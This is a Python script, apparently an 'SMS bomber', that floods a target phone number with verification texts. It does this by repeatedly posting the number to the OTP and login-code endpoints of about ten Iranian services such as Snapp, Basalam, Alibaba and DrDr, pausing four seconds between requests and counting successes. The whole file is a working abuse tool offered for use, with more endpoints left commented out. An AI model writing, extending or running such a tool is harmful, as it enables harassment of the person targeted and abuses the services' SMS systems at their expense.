import requests
import time
import json
import os

# text
class text:
    ## welcome
    def welcome():
        print(text.green+"""
──────────────────████
─────────────────█░░███
─────────────────█░░████
──────────────────███▒██─────████████
────────████████─────█▒█──████▒▒▒▒▒▒████
──────███▒▒▒▒▒▒████████████░░████▒▒▒▒▒███
────██▒▒▒▒░▒▒████░░██░░░░██░░░░░█▒▒▒▒▒▒▒███
───██▒▒░░░░▒██░░░░░█▒░░░░░██▒░░░░░░░▒▒▒▒▒▒█
──██▒░░░░░▒░░░░░░░░░▒░░░░░░░▒▒░░░░░░░▒▒▒▒▒██
──█░░░░░░▒░░░██░░░░░░░░░░░░░██░░░░░░░░▒▒▒▒▒█
──█░░░░░░░░█▒▒███░░░░░░░░░█▒▒███░░░░░░░▒▒▒▒█
──█░░░░░░░████████░░░░░░░████████░░░░░░▒▒▒▒█
──█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒█
──██░░░█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█░▒▒▒▒█
───█░░░░██░█░░░░░░░░░░░░░░░░░░░░░░░███▒▒▒▒▒█
───█▒▒░░░░█████░░░█░░░░██░░░██░░████░▒▒▒▒▒▒█
───██▒▒░░░░░█████████████████████░░░▒▒▒▒▒▒██
────██▒▒▒▒░░░░░██░░░███░░░██░░░█░░░▒▒▒▒▒▒██
─────███▒▒▒░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒█████
───────███▒▒▒▒▒▒░░░░░░░░░░░░░▒▒▒▒▒▒████
──────────██████████████████████████

╻ ╻┏━╸╻  ┏━╸┏━┓┏┳┓┏━╸   ╺┳╸┏━┓   ┏━┓┏━┓┏━┓┏┳┓┏┳┓┏━╸┏━┓
┃╻┃┣╸ ┃  ┃  ┃ ┃┃┃┃┣╸     ┃ ┃ ┃   ┗━┓┣━┛┣━┫┃┃┃┃┃┃┣╸ ┣┳┛
┗┻┛┗━╸┗━╸┗━╸┗━┛╹ ╹┗━╸    ╹ ┗━┛   ┗━┛╹  ╹ ╹╹ ╹╹ ╹┗━╸╹┗╸""")

    ## love
    def love():
        print(text.header+"""
────────────────────▒
───────────────────░█
──────────────────███
─────────────────██ღ█
────────────────██ღ▒█──────▒█
───────────────██ღ░▒█───────██
───────────────█ღ░░ღ█──────█ღ▒█
──────────────█▒ღ░▒ღ░█───██░ღღ█
─────────────░█ღ▒░░▒ღ░████ღღღ█
─────░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
─────▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
─────██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
─────██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
────██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
────█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
───██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
───█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
──██ღღ▒████████████ღღ████████████░ღ█▒
──█░ღღ████████████████████████████ღღ█
──█▒ღ██████████████████████████████ღ█
──██ღღ████████████████████████████ღ██
───██ღღ██████████████████████████ღ██
────░██ღღ██████████████████████ღღ██
──────▓██ღ▒██████████████████▒ღ██
─────░──░███ღ▒████████████▒ღ███
──────░░───▒██ღღ████████▒ღ██
─────────────▒██ღ██████ღ██
───────────────██ღ████ღ█
─────────────────█ღ██ღ█
──────────────────█ღღ█
──────────────────█ღ█░
───────────────────██░
"""+text.endc)

    ## colors list
    header = '\033[95m'
    blue = '\033[94m'
    cyan = '\033[96m'
    green = '\033[92m'
    warning = '\033[93m'
    fail = '\033[91m'
    endc = '\033[0m'
    bold = '\033[1m'

    ## status 
    def status(path, message = ""):
        if (path == "+"): return "["+text.green+"*"+text.endc+"] "+text.green+ message +text.endc
        if (path == "*"): return "["+text.warning+"*"+text.endc+"] "+text.warning+ message +text.endc
        if (path == "-"): return "["+text.fail+"*"+text.endc+"] "+text.fail+ message +text.endc
        if (path == "@"): return "["+text.cyan+"*"+text.endc+"] "+text.cyan+ message +text.endc
        if (path == "#"): return "["+text.header+"*"+text.endc+"] "+text.header+ message +text.endc

# spam
class spam:
    ## menu
    def menu():
        print(text.endc+"""
+----------------------------+--------+
|        Reason              | Number |
+----------------------------+--------+
| sms                        |      1 |
+----------------------------+--------+
| call                       |      2 |
+----------------------------+--------+
| email                      |      3 |
+----------------------------+--------+
""")

    ## sms script
    def sms(number,repetition):
        print("\n"+text.status("#")+"Starting to send SMS bombs ...")
        repetition = int(20) if repetition == "" else int(repetition)
        number_of_messages_sent = 0
        number = str(number)

        ### sms api
        sms_api = { "xxx1":{"name":"snapp","url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp","data": {"cellphone":"+98"+number}},
                    "xxx2":{"name":"basalam","url": "https://auth.basalam.com/otp-request","data": {"mobile":"0"+number,"client_id":11}},
                    "xxx3":{"name":"alibaba","url": "https://ws.alibaba.ir/api/v3/account/mobile/otp","data": {"phoneNumber":number}},
                    "xxx4":{"name":"gapfilm","url": "https://core.gapfilm.ir/api/v3.1/Account/Login","data": {"Type":3,"Username":number,"SourceChannel":"GF_WebSite","SourcePlatform":"desktop","SourcePlatformAgentType":"Firefox","SourcePlatformVersion":"107.0","GiftCode":""}},
                    "xxx5":{"name":"snapp market","url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone="+number,"data": {}},
                    "xxx6":{"name":"tebinja","url": "https://www.tebinja.com/api/v1/users","data": {"username":"0"+number}},
                    "xxx7":{"name":"zarinplus","url": "https://api.zarinplus.com/user/zarinpal-login","data": {"phone_number":"98"+number,"source":"zarinplus"}},
                    "xxx8":{"name":"snapp express","url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=SUPERAPP_SPLITPAGE&optionalClient=SUPERAPP_SPLITPAGE&deviceType=SUPERAPP_SPLITPAGE&appVersion=5.6.6&clientVersion=da9a878a&optionalVersion=5.6.6&UDID=437b9076-0c60-49cc-89f9-7fcb2d47fa10","data": {"cellphone":"0"+number,"captcha":"","local":""}},
                    "xxx9":{"name":"snapp market","url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0"+number+"&platform=PWA","data": {}},
                    "xx10":{"name":"drdr","url": "https://drdr.ir/api/registerEnrollment/sendDisposableCode","data": {"phoneNumber":number,"userType":"PATIENT"}},
                    ## "xxxx":{"name":"snapp food","url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=dc095b05-202c-4a71-9e9b-9127688fc54e&locale=fa","data": {"cellphone":"0"+number}},
                    ## "xxxx":{"name":"snapp doctor","url": "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/"+number+"/sms?cCode=+98","data": {}},
                    ## "xxxx":{"name":"snapp room","url": "https://napi.snapproom.com/users/self/verification-flow","data": {"username":"0"+number}},
                    ## "xxxx":{"name":"digikala","url": "https://api.digikala.com/v1/user/authenticate/","data": {"backUrl":"/","username":"0"+number,"otp_call":False}},
                    ## "call":{"name":"komodaa","url": "https://api.komodaa.com/api/v2.6/loginRC/request","data": {"phone_number":"0"+number}},
                }

        ### spam while
        while repetition > number_of_messages_sent:
            for sms_provider in sms_api:
                if (number_of_messages_sent >= repetition): break 
                provider_name = sms_api[sms_provider]["name"]
                api_url = sms_api[sms_provider]["url"]
                submission_format = sms_api[sms_provider]["data"]
                send_message = requests.post(api_url,data=submission_format)
                print(text.status("#")+"Send SMS +1 ("+str(number_of_messages_sent+1)+") ("+provider_name+") "+text.header+send_message.reason+text.endc)
                if (send_message.reason == "OK"): number_of_messages_sent+=1
                time.sleep(4)

        ### while else        
        else :
            text.love()
            print(text.status("#")+"Messages sent successfully (:")
            input(text.status("@","Press enter to refresh the page "))

# cmd
class cmd:
    ## clear screen
    def clear():
        os.system('clear' if os.name == 'posix' else 'cls')

    ## run command
    def run(path):
        os.system(path)
        